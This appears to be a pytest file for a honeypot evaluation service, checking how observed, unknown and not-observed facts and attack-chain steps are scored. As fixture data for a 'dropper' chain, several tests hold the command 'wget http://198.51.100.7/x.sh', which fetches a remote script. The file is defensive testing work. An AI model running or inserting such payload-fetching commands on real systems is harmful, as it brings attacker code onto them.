from app.services.evaluation.sanity import Observation
from app.services.evaluation.scoring import score_characteristics
from app.services.evaluation.static.chains import ChainStepResult


def _obs(status: str) -> Observation:
    return Observation(probe_id="p", establishes="f", value=None, fact_status=status)


def test_unknown_facts_are_excluded_not_counted_as_failures() -> None:
    # Two observed, one unknown. The score must be 1.0 -- everything we could
    # check passed. Counting the unknown as a failure would report 0.667 and
    # blame the honeypot for our own timeout.
    scores = score_characteristics(
        {"basic_commands": [_obs("observed"), _obs("observed"), _obs("unknown")]}, []
    )
    assert scores["basic_commands"] == 1.0


def test_a_characteristic_with_only_unknowns_scores_none_not_zero() -> None:
    # None means "not established". Zero would read as "scored zero", which
    # is a verdict we have not earned.
    scores = score_characteristics({"services": [_obs("unknown"), _obs("unknown")]}, [])
    assert scores["services"] is None


def test_not_observed_lowers_the_score() -> None:
    scores = score_characteristics(
        {"file_system": [_obs("observed"), _obs("not_observed")]}, []
    )
    assert scores["file_system"] == 0.5


def test_attack_possibilities_comes_from_the_chain_results() -> None:
    chain_results = [
        ChainStepResult(
            chain_id="dropper",
            step_index=0,
            command="wget http://198.51.100.7/x.sh",
            cowrie_event_id="e-2",
            matched_rule_id="T1105",
            expected_technique_id="T1105",
            fact_status="observed",
        ),
        ChainStepResult(
            chain_id="dropper",
            step_index=1,
            command="",
            cowrie_event_id=None,
            matched_rule_id=None,
            expected_technique_id="T1222.002",
            fact_status="not_observed",
        ),
    ]
    scores = score_characteristics({}, chain_results)
    assert scores["attack_possibilities"] == 0.5


def test_attack_possibilities_key_is_a_plain_string() -> None:
    # The return dict must use a consistent key type. observations_by_characteristic
    # keys are plain strings (per the function signature); attack_possibilities,
    # which this function derives internally from chain_results, must match that
    # type rather than leaking a Characteristic enum member into the dict.
    scores = score_characteristics(
        {},
        [
            ChainStepResult(
                chain_id="dropper",
                step_index=0,
                command="wget http://198.51.100.7/x.sh",
                cowrie_event_id="e-2",
                matched_rule_id="T1105",
                expected_technique_id="T1105",
                fact_status="observed",
            )
        ],
    )
    (key,) = scores.keys()
    assert type(key) is str


def test_all_unknown_chain_results_score_none_not_zero() -> None:
    chain_results = [
        ChainStepResult(
            chain_id="dropper",
            step_index=0,
            command="",
            cowrie_event_id=None,
            matched_rule_id=None,
            expected_technique_id="T1105",
            fact_status="unknown",
        )
    ]
    scores = score_characteristics({}, chain_results)
    assert scores["attack_possibilities"] is None


def test_no_composite_or_overall_score_key_is_produced() -> None:
    # This subsystem deliberately has no combined score. Guard against one
    # being added later under a plausible-looking key.
    scores = score_characteristics(
        {"basic_commands": [_obs("observed")]},
        [
            ChainStepResult(
                chain_id="dropper",
                step_index=0,
                command="wget http://198.51.100.7/x.sh",
                cowrie_event_id="e-2",
                matched_rule_id="T1105",
                expected_technique_id="T1105",
                fact_status="observed",
            )
        ],
    )
    forbidden = {"overall", "composite", "total", "average", "score", "final"}
    assert not (set(scores.keys()) & forbidden)
